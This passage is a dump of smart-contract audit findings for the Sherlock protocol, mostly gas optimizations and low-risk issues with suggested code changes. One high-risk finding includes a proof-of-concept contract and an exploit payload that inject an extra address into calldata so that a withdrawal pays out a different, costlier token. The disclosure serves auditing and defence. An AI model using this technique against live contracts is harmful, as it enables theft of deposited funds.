"https://github.com/code-423n4/2021-07-sherlock-findings/issues/125", "labels": ["bug", "0 (Non-critical)", "sponsor confirmed"], "target": "2021-07-sherlock-findings", "body": "# Handle  0xsanson   # Vulnerability details  ## Impact In the function `_doSherX` in Payout.sol, the natSpec comment @return states that `sherUsd` is the 'Total amount of USD of the underlying tokens that are being transferred'. I think that's a typo, and it's supposed to be the amount *excluded* from being transferred.  ## Proof of Concept Payout.sol L71  ## Tools Used editor  ## Recommended Mitigation Steps Correct the statement.  "}, {"title": "gas reduction in `calcUnderlying`", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/124", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-07-sherlock-findings", "body": "# Handle  0xsanson   # Vulnerability details  ## Impact In the `calcUnderlying` function of LibSherX.sol, the value `gs.tokensSherX.length` can be written down once to save gas (around 300-500 when called in the present tests).  ## Proof of Concept https://github.com/code-423n4/2021-07-sherlock/blob/main/contracts/libraries/LibSherX.sol#L55-L60  ## Tools Used hardhat gas calculator  ## Recommended Mitigation Steps Suggested adding `uint256 SherXLength = gs.tokensSherX.length;` and replacing this value throughout the function (three instances).  "}, {"title": "Poorly Named variables", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/123", "labels": ["bug", "0 (Non-critical)", "sponsor confirmed", "disagree with severity"], "target": "2021-07-sherlock-findings", "body": "# Handle  tensors   # Vulnerability details  ## Impact Poorly named variables in Gov.sol  ## Proof of Concept _protocolPremium is a bool while protcolPremium is a mapping to uint. This is confusing a could potentially cause some input errors.  ## Recommended Mitigation Steps Rename variables.  "}, {"title": "Unused functions and storage cost gas.", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/120", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-07-sherlock-findings", "body": "Unused functions and storage cost gas."}, {"title": "Single under-funded protocol can break paying off debt", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/119", "labels": ["bug", "3 (High Risk)", "sponsor acknowledged"], "target": "2021-07-sherlock-findings", "body": "Single under-funded protocol can break paying off debt"}, {"title": "ERC20 can accidentally burn tokens", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/118", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2021-07-sherlock-findings", "body": "ERC20 can accidentally burn tokens"}, {"title": "ERC20 non-standard names", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/117", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed", "disagree with severity"], "target": "2021-07-sherlock-findings", "body": "# Handle  cmichel   # Vulnerability details  Usually, the functions to increase the allowance are called `increaseAllowance` and `decreaseAllowance` but in `SherXERC20` they are called `increaseApproval` and `decreaseApproval`  ## Recommendation Rename these functions to the more common names.  "}, {"title": "`initializeSherXERC20` can be called more than once", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/116", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-07-sherlock-findings", "body": "# Handle  cmichel   # Vulnerability details  The `SherXERC20.initializeSherXERC20` function has `initialize` in its name which indicates that it should only be called once to initialize the storage. But it can be repeatedly called to overwrite and update the ERC20 name and symbol.  ## Recommendation Consider an `initializer` modifier or reverting if `name` or `symbol` is already set.  "}, {"title": "Sanitize `_weights` in `setWeights` on every use", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/115", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-07-sherlock-findings", "body": "# Handle  cmichel   # Vulnerability details  The `setWeights` function only stores the `uint16` part of `_weights[i]` in storage (`ps.sherXWeight = uint16(_weights[i])`). However, to calculate `weightAdd/weightSub` the full value (not truncated to 16 bits) is used. This can lead to discrepancies as the actually added part is different from the one tracked in the `weightAdd` variable.   "}, {"title": "Anyone can unstake on behalf of someone", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/114", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-07-sherlock-findings", "body": "# Handle  cmichel   # Vulnerability details  The `PoolBase.unstakeWindowExpiry` function allows unstaking tokens of other users. While the tokens are sent to the correct address, this can lead to issues with smart contracts that might rely on claiming the tokens themselves.  For example, suppose the `_to` address corresponds to a smart contract that has a function of the following form:  ```solidity function withdrawAndDoSomething() {     uint256 amount = token.balanceOf(address(this));     contract.unstakeWindowExpiry(address(this), id, token);     amount = amount - token.balanceOf(address(this));     token.transfer(externalWallet, amount) } ```  If the contract has no other functions to transfer out funds, they may be locked forever in this contract.  "}, {"title": "[Gas optimizations] - Public functions that are public, but could be external", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/112", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-07-sherlock-findings", "body": "# Handle  a_delamo   # Vulnerability details  ## Impact  The following functions are public, but they could be decla  ``` getUnactivatedStakersPoolBalance(IERC20) should be declared external:         - PoolBase.getUnactivatedStakersPoolBalance(IERC20) (contracts/facets/PoolBase.sol#146-148) getTotalUnmintedSherX(IERC20) should be declared external:         - PoolBase.getTotalUnmintedSherX(IERC20) (contracts/facets/PoolBase.sol#170-173) accruedDebt(bytes32,IERC20) should be declared external:         - LibPool.accruedDebt(bytes32,IERC20) (contracts/libraries/LibPool.sol#31-34) getTotalAccruedDebt(IERC20) should be declared external:         - LibPool.getTotalAccruedDebt(IERC20) (contracts/libraries/LibPool.sol#36-39) accrueSherX(IERC20) should be declared external:         - LibSherX.accrueSherX(IERC20) (contracts/libraries/LibSherX.sol#75-81) accrueSherXWatsons() should be declared external:         - LibSherX.accrueSherXWatsons() (contracts/libraries/LibSherX.sol#83-86) deposit() should be declared external:         - AaveV2.deposit() (contracts/strategies/AaveV2.sol#75-81) ```   ## Tools Used  Slither     "}, {"title": "`TokenToLock` default value", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/110", "labels": ["bug", "invalid", "2 (Med Risk)", "sponsor disputed"], "target": "2021-07-sherlock-findings", "body": "`TokenToLock` default value"}, {"title": "`_doSherX` does not return correct precision and it's confusing", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/108", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-07-sherlock-findings", "body": "# Handle  cmichel   # Vulnerability details  The `_doSherX` function does not return the correct precision of `sherUsd` and it is **not** the \"Total amount of USD of the underlying tokens that are being transferred\" that the documentation mentions.  ```solidity sherUsd = amounts[i].mul(sx.tokenUSD[tokens[i]]); ```  Instead, the amount is inflated by `1e18`, it should divide the amount by `1e18` to get a USD value with 18 decimal precision.  The severity is low as the calling site in `payout` makes up for it by dividing by `1e18` in the `deduction` computation.  We still recommend returning the correct amount in `_doSherX` already to match the documentation and avoid any future errors when using its unintuitive return value.  "}, {"title": "`_doSherX` optimistically assumes premiums will be paid", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/107", "labels": ["bug", "2 (Med Risk)", "sponsor acknowledged"], "target": "2021-07-sherlock-findings", "body": "`_doSherX` optimistically assumes premiums will be paid"}, {"title": "Missing verification on `tokenInit`'s lock", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/105", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-07-sherlock-findings", "body": "# Handle  cmichel   # Vulnerability details  The `Gov.tokenInit` skips the underlying token check if the `_token` is SHERX:  ```solidity if (address(_token) != address(this)) {   require(_lock.underlying() == _token, 'UNDERLYING'); } ```  ## Impact This check should still be performed even for `_token == address(this) // SHERX`, otherwise, the lock can have a different underlying and potentially pay out wrong tokens.  ## Recommendation Verify the underlying of all locks.  "}, {"title": "Unbounded iteration over all protocols", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/104", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2021-07-sherlock-findings", "body": "Unbounded iteration over all protocols"}, {"title": "Unbounded iteration over all staking tokens", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/103", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2021-07-sherlock-findings", "body": "Unbounded iteration over all staking tokens"}, {"title": "Unbounded iteration over all premium tokens", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/102", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2021-07-sherlock-findings", "body": "Unbounded iteration over all premium tokens"}, {"title": "`transferFrom` gas improval", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/100", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "disagree with severity"], "target": "2021-07-sherlock-findings", "body": "# Handle  cmichel   # Vulnerability details  The `SherXERC20.transferFrom` function reads the allowance from memory twice. It should be read once, cached, and then use that value for the `if(cachedAllowance ...)` and for the `newApproval = ...` expressions.  "}, {"title": "`increaseApproval` gas improval", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/98", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-07-sherlock-findings", "body": "# Handle  cmichel   # Vulnerability details  The `SherXERC20.increaseApproval` function reads the allowance from memory twice. It should be read once and then cached and for the event you the `cache + _amount` value.  "}, {"title": "`payout` does token transfers twice", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/97", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-07-sherlock-findings", "body": "`payout` does token transfers twice"}, {"title": "`SherX.setWeights` only accrue _tokens", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/96", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-07-sherlock-findings", "body": "`SherX.setWeights` only accrue _tokens"}, {"title": "Check _aaveLmReceiver and _sherlock are not empty", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/95", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2021-07-sherlock-findings", "body": "Check _aaveLmReceiver and _sherlock are not empty"}, {"title": "Loops may exceed gas limit", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/93", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2021-07-sherlock-findings", "body": "Loops may exceed gas limit"}, {"title": "getInitialUnstakeEntry when unstakeEntries is empty", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/92", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2021-07-sherlock-findings", "body": "getInitialUnstakeEntry when unstakeEntries is empty"}, {"title": "[Bug] A critical bug in bps function", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/90", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2021-07-sherlock-findings", "body": "# Handle  hrkrshnn   # Vulnerability details  ## A critical bug in bps function: PoolBase.sol  ``` solidity function bps() internal pure returns (IERC20 rt) {   // These fields are not accessible from assembly   bytes memory array = msg.data;   uint256 index = msg.data.length;    // solhint-disable-next-line no-inline-assembly   assembly {     // Load the 32 bytes word from memory with the address on the lower 20 bytes, and mask those.     rt := and(mload(add(array, index)), 0xffffffffffffffffffffffffffffffffffffffff)   } } ```  The above function is designed to expect the token at the end of `calldata`, but a malicious user can inject extra values at the end of `calldata` and fake return values.  The following contract demonstrates an example:  ``` solidity pragma solidity 0.8.6;  interface IERC20 {}  error StaticCallFailed();  contract BadEncoding {     /// Will return address(1). But address(0) is expected!     function f() external view returns (address) {         address actual = address(0);         address injected = address(1);          (bool success, bytes memory ret) = address(this).staticcall(abi.encodeWithSelector(this.g.selector, actual, injected));          if (!success) revert StaticCallFailed();          return abi.decode(ret, (address));     }     function g(IERC20 _token) external pure returns (IERC20) {         // to get rid of the unused warning         _token;         // Does it always match _token?         return bps();     }     // From Sherlock Protocol: PoolBase.sol     function bps() internal pure returns (IERC20 rt) {         // These fields are not accessible from assembly         bytes memory array = msg.data;         uint256 index = msg.data.length;          // solhint-disable-next-line no-inline-assembly         assembly {             // Load the 32 bytes word from memory with the address on the lower 20 bytes, and mask those.             rt := and(mload(add(array, index)), 0xffffffffffffffffffffffffffffffffffffffff)         }     } } ```  ### An example exploit  This can be used to exploit the protocol:  ``` solidity function unstake(   uint256 _id,   address _receiver,   IERC20 _token ) external override returns (uint256 amount) {   PoolStorage.Base storage ps = baseData();   require(_receiver != address(0), 'RECEIVER');   GovStorage.Base storage gs = GovStorage.gs();   PoolStorage.UnstakeEntry memory withdraw = ps.unstakeEntries[msg.sender][_id];   require(withdraw.blockInitiated != 0, 'WITHDRAW_NOT_ACTIVE');   // period is including   require(withdraw.blockInitiated + gs.unstakeCooldown < uint40(block.number), 'COOLDOWN_ACTIVE');   require(     withdraw.blockInitiated + gs.unstakeCooldown + gs.unstakeWindow >= uint40(block.number),     'UNSTAKE_WINDOW_EXPIRED'   );   amount = withdraw.lock.mul(LibPool.stakeBalance(ps)).div(ps.lockToken.totalSupply());    ps.stakeBalance = ps.stakeBalance.sub(amount);   delete ps.unstakeEntries[msg.sender][_id];   ps.lockToken.burn(address(this), withdraw.lock);   _token.safeTransfer(_receiver, amount); } ```  State token `Token1`. Let's say there is a more expensive token `Token2`.  Here's an example exploit:  ``` solidity bytes memory exploitPayload = abi.encodeWithSignature(     PoolBase.unstake.selector,     (uint256(_id), address(_receiver), address(Token2), address(Token1)) ); poolAddress.call(exploitPayload); ```  All the calculations on `ps` would be done on `Token2`, but at the end, because of, `_token.safeTransfer(_receiver, amount);`, `Token2` would be transferred. Assuming that `Token2` is more expensive than `Token1`, the attacker makes a profit.  Similarly, the same technique can be used at a lot of other places. Even if this exploit is not profitable, the fact that the computations can be done on two different tokens is buggy.  There are several other places where the same pattern is used. All of them needs to be fixed. I've not written an exhaustive list.   "}, {"title": "General suggestions", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/89", "labels": ["bug", "0 (Non-critical)", "sponsor confirmed"], "target": "2021-07-sherlock-findings", "body": "# Handle  hrkrshnn   # Vulnerability details  ## Use `type(uintX).max` instead of `uintX(-1)`  ``` diff modified   contracts/facets/Gov.sol @@ -55,7 +55,7 @@ contract Gov is IGov {      GovStorage.Base storage gs = GovStorage.gs();      SherXStorage.Base storage sx = SherXStorage.sx();  -    return sx.sherXPerBlock.mul(gs.watsonsSherxWeight).div(uint16(-1)); +    return sx.sherXPerBlock.mul(gs.watsonsSherxWeight).div(type(uint16).max);    }     function getWatsonsUnmintedSherX() external view override returns (uint256) { ```  Use `type(integerType).max` for such cases. There are also other places that could use this.  ## Have NatSpec comments for all functions ## Avoid the diamond standard  The most significant optimization that can be done in the contract is to get rid of the diamond standard, because, proxy architectures are inherently expensive. Unless there are specific reasons, such as contract size limits, a diamond makes the contract unnecessary complex. Also, try to avoid upgradability if you can afford it.   "}, {"title": "[Optimization] Changing memory to calldata and again caching in loops", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/87", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-07-sherlock-findings", "body": "# Handle  hrkrshnn   # Vulnerability details  ## Change memory to calldata and caching in loop  ``` diff modified   contracts/facets/Manager.sol @@ -139,16 +139,17 @@ contract Manager is IManager {     function setProtocolPremiumAndTokenPrice(      bytes32 _protocol, -    IERC20[] memory _token, -    uint256[] memory _premium, -    uint256[] memory _newUsd +    IERC20[] calldata _token, +    uint256[] calldata _premium, +    uint256[] calldata _newUsd    ) external override onlyGovMain {      require(_token.length == _premium.length, 'LENGTH_1');      require(_token.length == _newUsd.length, 'LENGTH_2');       (uint256 usdPerBlock, uint256 usdPool) = _getData();  -    for (uint256 i; i < _token.length; i++) { +    uint length = _token.length; +    for (uint256 i; i < length; i++) {        LibPool.payOffDebtAll(_token[i]);        (usdPerBlock, usdPool) = _setProtocolPremiumAndTokenPrice(          _protocol, ```  About caching in loop, see my other report on why it's needed.  For the old code, i.e., having an array in memory, there is an unnecessary copy from `calldata` to `memory`. In the proposed patch, this unnecessary copy is avoided and values are directly read from `calldata` by using `calldataload(...)` instead of going via `calldatacopy(...)`, then `mload(...)`). Saves memory expansion cost, and cost of copying from `calldata` to `memory`.  There are several other places throughout the codebase where the same optimization can be used. I've not provided an exhaustive list.   "}, {"title": "[Optimization] Caching in for loops", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/86", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-07-sherlock-findings", "body": "# Handle  hrkrshnn   # Vulnerability details  ## Caching in for loops  ``` diff modified   contracts/facets/PoolBase.sol @@ -128,19 +128,21 @@ contract PoolBase is IPoolBase {    {      PoolStorage.Base storage ps = baseData();      GovStorage.Base storage gs = GovStorage.gs(); -    for (uint256 i = 0; i < ps.unstakeEntries[_staker].length; i++) { -      if (ps.unstakeEntries[_staker][i].blockInitiated == 0) { +    PoolStorage.UnstakeEntry[] storage entries = ps.unstakeEntries[_staker]; +    uint length = entries.length; +    for (uint256 i = 0; i < length; i++) { +      if (entries[i].blockInitiated == 0) {          continue;        }        if ( -        ps.unstakeEntries[_staker][i].blockInitiated + gs.unstakeCooldown + gs.unstakeWindow <= +        entries[i].blockInitiated + gs.unstakeCooldown + gs.unstakeWindow <=          uint40(block.number)        ) {          continue;        }        return i;      } -    return ps.unstakeEntries[_staker].length; +    return length;    } ```  Caching expensive state variables would avoid re-reading from storage. Solidity's optimizer currently will not be able to cache this value (the IR based codegen and the Yul optimizer can do it; but that is not activated by default).   "}, {"title": "[Optimization] Packing various structs carefully", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/85", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-07-sherlock-findings", "body": "# Handle  hrkrshnn   # Vulnerability details  ## Packing the struct  ``` diff modified   contracts/storage/GovStorage.sol @@ -14,15 +14,17 @@ library GovStorage {    struct Base {      // The address appointed as the govMain entity      address govMain; +    // The amount of blocks the cooldown period takes +    uint40 unstakeCooldown; +    // The amount of blocks for the window of opportunity of unstaking +    uint40 unstakeWindow; +    // Check if the protocol is included in the solution at all +    uint16 watsonsSherxWeight; +    // The last block the total amount of rewards were accrued.      // NOTE: UNUSED      mapping(bytes32 => address) protocolManagers;      // Based on the protocol identifier, get the address of the protocol that is able the withdraw balances      mapping(bytes32 => address) protocolAgents; -    // The amount of blocks the cooldown period takes -    uint40 unstakeCooldown; -    // The amount of blocks for the window of opportunity of unstaking -    uint40 unstakeWindow; -    // Check if the protocol is included in the solution at all      mapping(bytes32 => bool) protocolIsCovered;      // The array of tokens the accounts are able to stake in      IERC20[] tokensStaker; @@ -33,8 +35,6 @@ library GovStorage {      address watsonsAddress;      // How much sherX is distributed to this account      // The max value is uint16(-1), which means 100% of the total SherX minted is allocated to this acocunt -    uint16 watsonsSherxWeight; -    // The last block the total amount of rewards were accrued.      uint40 watsonsSherxLastAccrued;    } ```  In the current layout, the members `govMain`, `unstakeCooldown`, `unstakeWindow`, `watsonsSherxWeight` all can be packed to a single slot or exactly 256 bits. This can save gas if both such elements are read or written at the same time (please use at least 0.8.2, since it has some improvements centred around optimizing packed Structs).  In the previous layout:  1.  `govMain` would have a slot of its own. 2.  `unstakeCooldown` and `unstakeWindow` would be packed together in a     single slot. 3.  `watsonsSherxWeight` and `watsonsSherxLastAccrued` would be packed     together in a single slot.  Note that gas savings are mainly relevant in the following cases:  1.  Compiler can optimize certain reads and writes to the same slot. 2.  Berlin EIP-2929 based gas accounting, i.e., if the same tx leaves     one of the slot warm. 3.  Berlin EIP-2930 for access lists. Instead of having to making three     different slots warm (in the original code), one only has to make     two slots warm, if necessary.  If none of these applies for your case, this suggestion may be ignored.  ## Packing for PoolStorage  ``` diff modified   contracts/storage/PoolStorage.sol @@ -15,20 +15,35 @@ library PoolStorage {     struct Base {      address govPool; +    // The last block the total amount of rewards were accrued. +    // Accrueing SherX increases the `unallocatedSherX` variable +    uint40 sherXLastAccrued; +    // Protocol debt can only be settled at once for all the protocols at the same time +    // This variable is the block number the last time all the protocols debt was settled +    uint40 totalPremiumLastPaid; + +    // How much sherX is distributed to stakers of this token +    // The max value is uint16(-1), which means 100% of the total SherX minted is allocated to this pool +    uint16 sherXWeight;      //      // Staking      //      // Indicates if stakers can stake funds in the pool      bool stakes; -    // Address of the lockToken. Representing stakes in this pool -    ILock lockToken;      // Variable used to calculate the fee when activating the cooldown      // Max value is uint32(-1) which creates a 100% fee on the withdrawal      uint32 activateCooldownFee; +    // Address of the lockToken. Representing stakes in this pool +    // Indicates if protocol are able to pay premiums with this token +    // If this value is true, the token is also included as underlying of the SherX +    bool premiums; + +    ILock lockToken;      // The total amount staked by the stakers in this pool, including value of `firstMoneyOut`      // if you exclude the `firstMoneyOut` from this value, you get the actual amount of tokens staked      // This value is also excluding funds deposited in a strategy.      uint256 stakeBalance; +      // All the withdrawals by an account      // The values of the struct are all deleted if expiry() or unstake() function is called      mapping(address => UnstakeEntry[]) unstakeEntries; @@ -39,12 +54,6 @@ library PoolStorage {      // SherX could be minted before the stakers call the harvest() function      // Minted SherX that is assigned as reward for the pool will be added to this value      uint256 unallocatedSherX; -    // How much sherX is distributed to stakers of this token -    // The max value is uint16(-1), which means 100% of the total SherX minted is allocated to this pool -    uint16 sherXWeight; -    // The last block the total amount of rewards were accrued. -    // Accrueing SherX increases the `unallocatedSherX` variable -    uint40 sherXLastAccrued;      // Non-native variables      // These variables are used to calculate the right amount of SherX rewards for the token staked      mapping(address => uint256) sWithdrawn; @@ -52,9 +61,6 @@ library PoolStorage {      //      // Protocol payments      // -    // Indicates if protocol are able to pay premiums with this token -    // If this value is true, the token is also included as underlying of the SherX -    bool premiums;      // Storing the protocol token balance based on the protocols bytes32 indentifier      mapping(bytes32 => uint256) protocolBalance;      // Storing the protocol premium, the amount of debt the protocol builds up per block. @@ -62,9 +68,6 @@ library PoolStorage {      mapping(bytes32 => uint256) protocolPremium;      // The sum of all the protocol premiums, the total amount of debt that builds up in this token. (per block)      uint256 totalPremiumPerBlock; -    // Protocol debt can only be settled at once for all the protocols at the same time -    // This variable is the block number the last time all the protocols debt was settled -    uint40 totalPremiumLastPaid;      // How much token (this) is available for sherX holders      uint256 sherXUnderlying;      // Check if the protocol is included in the token pool ```  For the same reasons as before. Taking a quick look at the code, this change should reduce gas. (Might require 0.8.2, though; there was an improvement in the optimizer that would apply to packed structs in storage.)   "}, {"title": "[Optimization] Use at least 0.8.4", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/84", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-07-sherlock-findings", "body": "[Optimization] Use at least 0.8.4"}, {"title": "[Optimization] Setting higher value for optimize-runs", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/83", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-07-sherlock-findings", "body": "# Handle  hrkrshnn   # Vulnerability details  ## Higher value of optimize-runs  ``` diff modified   hardhat.config.js @@ -25,7 +25,7 @@ module.exports = {      settings: {        optimizer: {          enabled: true, -        runs: 200, +        runs: 20000,        },      },    }, ```  This value is a tuning parameter for deploy v/s runtime costs. Higher values optimize for lower runtime cost, which is what you are looking for. The above value is an example, please decide a suitable high value, and run tests.  "}, {"title": "[Optimization] A branchless version of an if else statement", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/82", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-07-sherlock-findings", "body": "# Handle  hrkrshnn   # Vulnerability details  ## Writing a branch less version  ``` diff @@ -76,11 +77,11 @@ contract SherXERC20 is IERC20, ISherXERC20 {      require(_amount != 0, 'AMOUNT');      SherXERC20Storage.Base storage sx20 = SherXERC20Storage.sx20();      uint256 oldValue = sx20.allowances[msg.sender][_spender]; -    if (_amount > oldValue) { -      sx20.allowances[msg.sender][_spender] = 0; -    } else { -      sx20.allowances[msg.sender][_spender] = oldValue.sub(_amount); -    } +    uint256 newValue; +    assembly { +        newValue := mul(gt(oldValue, _amount), sub(oldValue, _amount)) +    } +    sx20.allowances[msg.sender][_spender] = newValue;      emit Approval(msg.sender, _spender, sx20.allowances[msg.sender][_spender]);      return true;    } ```  The branch-less version avoids at least two `jumpi`, i.e., at least 20 gas and some additional stack operations, along with deploy costs.  Here's a SMT proof that the transformation is equivalent:  ``` python from z3 import *  # A SMT proof that # # if (_amount > oldValue) { #   sx20.allowances[msg.sender][_spender] = 0; # } else { #   sx20.allowances[msg.sender][_spender] = oldValue.sub(_amount); # } # # is same as # # assembly { #     newValue := mul(gt(oldValue, _amount), sub(oldValue, _amount)) # } # sx20.allowances[msg.sender][_spender] = newValue; #  n_bits = 256 amount = BitVec('amount', n_bits) oldValue = BitVec('oldValue', n_bits) allowance = BitVec('oldValue', n_bits)  old_allowance_computation = If(UGT(amount, oldValue), 0, oldValue - amount)  def GT(x, y):     return If(UGT(x, y), BitVecVal(1, n_bits), BitVecVal(0, n_bits)) def MUL(x, y):     return x * y def SUB(x, y):     return x - y  new_allowance_computation = MUL(GT(oldValue, amount), SUB(oldValue, amount))  solver = Solver() solver.add(old_allowance_computation != new_allowance_computation)  result = solver.check() print(result) # unsat ```   "}, {"title": "[Optimization] Caching variable", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/81", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-07-sherlock-findings", "body": "# Handle  hrkrshnn   # Vulnerability details  ## Caching variable  ``` diff modified   contracts/facets/SherXERC20.sol @@ -66,8 +66,9 @@ contract SherXERC20 is IERC20, ISherXERC20 {      require(_spender != address(0), 'SPENDER');      require(_amount != 0, 'AMOUNT');      SherXERC20Storage.Base storage sx20 = SherXERC20Storage.sx20(); -    sx20.allowances[msg.sender][_spender] = sx20.allowances[msg.sender][_spender].add(_amount); -    emit Approval(msg.sender, _spender, sx20.allowances[msg.sender][_spender]); +    uint256 newAllowance = sx20.allowances[msg.sender][_spender].add(_amount); +    sx20.allowances[msg.sender][_spender] = newAllowance; +    emit Approval(msg.sender, _spender, newAllowance);      return true;    } ```  The above change would avoid a `sload`, and will instead use `dupX`, saving \\`100\\` gas.   "}, {"title": "getFirstMoneyOut _token parameter", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/79", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-07-sherlock-findings", "body": "getFirstMoneyOut _token parameter"}, {"title": "withdraw returns the final amount withdrawn", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/78", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-07-sherlock-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact function withdraw in ILendingPool returns the actual withdrawn amount, however, function withdraw in AaveV2 strategy does not check this return value so e.g. function strategyWithdraw may actually withdraw less but still add the full amount to the staked balance:      ps.strategy.withdraw(_amount);     ps.stakeBalance = ps.stakeBalance.add(_amount);  ## Recommended Mitigation Steps function withdraw in IStrategy should return uint indicating the actual withdrawn amount and functions that use it should account for that.  "}, {"title": "Call to LibDiamond.contractOwner() can be cached", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/73", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-07-sherlock-findings", "body": "Call to LibDiamond.contractOwner() can be cached"}, {"title": "Functions aBalance and balanceOf", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/72", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-07-sherlock-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact There is no difference between functions aBalance and balanceOf in contract AaveV2, they both return aWant, so there is no point in having them separately.  ## Recommended Mitigation Steps Remove internal function aBalance and make balanceOf public.  "}, {"title": "Re-entrancy mitigation", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/70", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2021-07-sherlock-findings", "body": "Re-entrancy mitigation"}, {"title": "Group related data into separate structs", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/69", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2021-07-sherlock-findings", "body": "Group related data into separate structs"}, {"title": "Inclusive checks", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/68", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2021-07-sherlock-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact These checks should be inclusive: ```solidity        require(amountOut > minOut, \"EarlyExit: Insufficient output\");   require(_bps > 0 && _bps < 1000, \"Must be between 0-100%\");   require(newThreshold > 0 && newThreshold < 10000, \"Threshold must be between 0-100%\");   require(_distance > 0 && _distance < 1000, \"Override must be between 0-100%\"); ```  ## Recommended Mitigation Steps Replace > with >= and < with <= where necesseary.  "}, {"title": "Approval event in LibSherXERC20", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/67", "labels": ["bug", "invalid", "0 (Non-critical)", "sponsor disputed"], "target": "2021-07-sherlock-findings", "body": "Approval event in LibSherXERC20"}, {"title": "AaveV2 approves lending pool in the constructor", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/65", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-07-sherlock-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact contract AaveV2 does not cache the lending pool, it retrieves it when necessary by calling a function getLp(). This is great as the implementation may change, however, this contract also approves an unlimited amount of want in the constructor:    ILendingPool lp = getLp();    want.approve(address(lp), uint256(-1)); so if the implementation changes, the approval will reset. This will break the deposit function as it will try to deposit to this new lending pool with 0 approval.   For reference, function setLendingPoolImpl: 